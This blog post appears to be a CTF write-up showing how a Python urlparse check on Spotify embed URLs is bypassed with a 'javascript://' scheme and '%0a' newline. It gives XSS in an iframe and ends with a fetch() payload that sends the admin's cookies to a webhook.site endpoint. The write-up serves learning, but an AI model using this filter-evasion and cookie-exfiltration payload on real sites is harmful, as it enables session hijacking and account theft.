# XSS Bypass urlparse filter evasion in Python

> **Author**: Roby Firnando Yusuf
> **Published**: Apr 19, 2026

---

![Roby Firnando Yusuf](https://miro.medium.com/v2/resize:fill:32:32/0*Pewp82KPmtDWWhGj.jpg)

Listen

Share

![image](https://miro.medium.com/v2/resize:fit:700/0*KWVigTDDMxpOFLmo.png)

TL;DR

Bypass urlparse with javascript:// protocol

This weekend, while preparing for my exam, I also tried a web exploitation challenge in k1nd4sus.it CTF 2026, held by k1nd4sus one of the top Italia CTF team.

At this point, I feel like such a noob when playing CTF, but I still have the spirit to take on some challenges to sharpen my analytical and technical skills. This challenge had me stuck for almost three hours, but that’s okay at least I learned something new.

So, let’s jump into the challenge

### Challenge Description

SpotiVibe 1

Now that Spotify has made their app uncrackable i decided to build my own personal version with the help of good old AI. It’s all so fantastic!!!

http://chall.k1nd4sus.it:30502

### Technical Analysis

![image](https://miro.medium.com/v2/resize:fit:700/1*bhY09v066YbsviZBQj1odg.png)

Given a web service and a ZIP file containing the challenge source code, we can analyze the application locally. When we open the web service, it looks like Spotify.

First, we analyze the source code. In the app.py file, we can see several routes:

- Login
- Register
- Dashboard
- Add song
- List song and Search song
- View detail song
- Report to admin

Since there is a report feature, we immediately suspected that this challenge might be an XSS challenge where we need to steal the admin’s cookie after they visit our URL.

![image](https://miro.medium.com/v2/resize:fit:700/1*dzphk2DYAozq1zuzbFg1Xg.png)

Next, we found an interesting route: add_song.

![image](https://miro.medium.com/v2/resize:fit:700/1*kntxAeDjD7q0c6oOyvAg5A.png)

In this route, we can add a song by inputting the Spotify embed code. We can also see a validator function called is_valid_spotify_url.

![image](https://miro.medium.com/v2/resize:fit:700/1*bAAMH5zfwC98Q_Ru2DTe1A.png)

This validator says that the hostname must be open.spotify.com and the path must start with /embed/.

## Get Roby Firnando Yusuf’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

So, the validator expects us to input something like this:

https://open.spotify.com/embed/track/6QFCMUUq1T2Vf5sFUXcuQ7?utm_source=generator

Next, let’s take a look at the render view file, song.html, which reflects the payload on the page. This file is rendered by the /song/<int:song_id> route, which is the song detail page.

![image](https://miro.medium.com/v2/resize:fit:700/1*951wgb7jnvtAukb4cOE8GQ.png)

We can see that the input URL is reflected inside the src attribute of an iframe tag. At first, I overthought it: what if we could bypass the is_valid_spotify_url function and input an external link containing an XSS payload? Could we steal the admin’s cookie?

For example, suppose we input http://malicious.com/xss.html. However, when we tried this in our local environment, it did not work. The iframe could not read the page’s cookie because of the Same-Origin Policy.

At that point, I was stuck and started thinking about how to bypass the is_valid_spotify_url function. After searching on Google, we found an interesting payload in the following repository:

https://github.com/Edr4/XSS-Bypass-Filters

![image](https://miro.medium.com/v2/resize:fit:700/1*1WW3y2A1uNJ1XjsMJPS96Q.png)

As you can see, it is possible to trigger XSS through the src attribute of an iframe tag. So the problem now was: how could we bypass the hostname and path validation?

Let’s take a look at this debug output.

![image](https://miro.medium.com/v2/resize:fit:700/1*gokoyXDmfyRlxzGqrcuKGQ.png)

Interesting! we can bypass urlparse using the javascript:// protocol, and to make the JavaScript execute properly, we need to use %0a as a newline character.

So, let’s try adding a new song with our bypass payload.

![image](https://miro.medium.com/v2/resize:fit:700/1*rtPub8TxTxy9Mn62GjrixA.png)

Then we save it, open the song detail page, and the alert is executed.

![image](https://miro.medium.com/v2/resize:fit:700/1*UQAXcL4PEFJLHiy8QDiUOw.png)

Next, we only need to modify the payload so it reads the admin’s cookie and sends it to our webhook. Here is the payload:

javascript://open.spotify.com/embed/%0afetch(‘https://webhook.site/22b1f9a2-f740-45fe-ba3a-ed8563f9f021?cok='+String(document.cookie))

And BOOM! we received the flag on our webhook.

![image](https://miro.medium.com/v2/resize:fit:700/1*HBxNaqAnKuKHx_XQtxZa-w.png)



---
*Original URL: [https://medium.com/@robyfirnandoyusuf/xss-bypass-urlparse-filter-evasion-in-python-30b3aa36247d?source=search_post---------29-----------------------------------](https://medium.com/@robyfirnandoyusuf/xss-bypass-urlparse-filter-evasion-in-python-30b3aa36247d?source=search_post---------29-----------------------------------)*
